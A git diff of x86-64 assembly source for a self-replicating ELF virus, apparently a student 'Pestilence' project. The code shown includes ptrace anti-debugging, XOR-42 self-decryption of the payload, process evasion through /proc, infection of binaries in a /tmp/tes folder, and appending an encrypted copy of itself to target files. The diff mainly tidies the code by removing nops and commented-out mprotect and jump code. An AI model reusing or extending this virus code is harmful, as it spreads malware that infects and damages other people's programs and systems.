@@ -31,6 +31,9 @@
 %define PF_W 2
 %define PF_R 4
 
+%define	S_IRUSR 256
+%define S_IWUSR 128
+
 %define PTRACE_TRACEME 0
 %define SELF_PID 0
 
@@ -99,8 +102,6 @@ global _start
 
 section .text
 _start:
-	S_IRUSR equ 256 ; Owner has read permission
-	S_IWUSR equ 128 ; Owner has write permission
 	mov r9, [rsp + 8]; save program name
 	push rdx
 	push rsp
@@ -120,6 +121,7 @@ _ptrace_anti_debug:
 
 	mov rax, SYS_GETGID
 	syscall
+
 _is_encrypted:
 	lea rdi, [r9]
 	mov rsi, O_RDONLY
@@ -148,17 +150,14 @@ _decypher:
 	.get_rip:
 		pop rbp
 		sub rbp, .get_rip
+
 	.loop:
 		lea r10, [rbp + _payload]
 		xor byte [r10 + r8], 42
 		inc r8
 		cmp r8, rdx
 		jl .loop
-	nop
-	nop
-	nop
-	nop
-	nop
+
 _payload:
 
 _evade_specific_process:                                  ; cd to /proc
@@ -293,7 +292,6 @@ _evade_specific_process:                                  ; cd to /proc
 			jl _proc_loop                           ; if it has still files to read continues to the next one
 			jmp _iterate_over_proc
 
-
 	_close_proc:
 		mov rdi, [r15 + 16]
 		mov rax, SYS_CLOSE
@@ -307,6 +305,7 @@ _evade_specific_process:                                  ; cd to /proc
 		mov rax, SYS_GETGID
 		syscall
 		jmp  _infinite_loop
+
 _folder_to_infect:	
 	mov qword [r15], '/tmp'
 	mov qword [r15 + 4], '/tes'
@@ -627,17 +626,18 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			.delta:
 				pop rbp
 				sub rbp, .delta
+
 		_append_virus:
 			xor r8, r8 ; i = 0
 			mov r9, _stop - _start ; virus length
 			mov rdi, [r15 + 1420]  ; fd
-			; mov byte r8, [rbp + _start] ; buffer to cypher
 
 			.loop:
 				lea rsi, [rbp + _start + r8]
 				mov rdx, 1
 				cmp r8, _payload - _start
 				jl .nocypher
+
 				.cypher:
 					cmp r8, pestilence - _start
 					jge .nocypher
@@ -646,8 +646,9 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 					xor r10b, 42
 					mov byte [r15 + 1538], r10b
 					lea rsi, [r15 + 1538]
+
 				.nocypher:
-				; mov byte r8, [rbp + _start + rcx]
+
 				mov rax, SYS_WRITE
 				syscall
 				inc r8
@@ -728,27 +729,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 		_next_phdr:
 			inc word [r15 + 1484]
-			; _mprotect:
-
-			; 	mov rdi, 4095
-			; 	not rdi
-			; 	call .get_rip
-			; 	.get_rip:
-			; 		pop rbp
-			; 	and rdi, rbp
-			; 	mov rsi, 4096
-			; 	mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
-			; 	mov rax, SYS_MPROTECT
-			; 	syscall
-		; 	nop
-		_pseudo_jump:
-			; call .get_rip
-			; .get_rip:
-			; 	pop rbp
-			; mov byte [rbp + 5], 0xe9
-			nop
 			jmp _read_phdr
-		; 	nop
 
 	_close_bin:
 		mov qword rdi, [r15 + 1420]
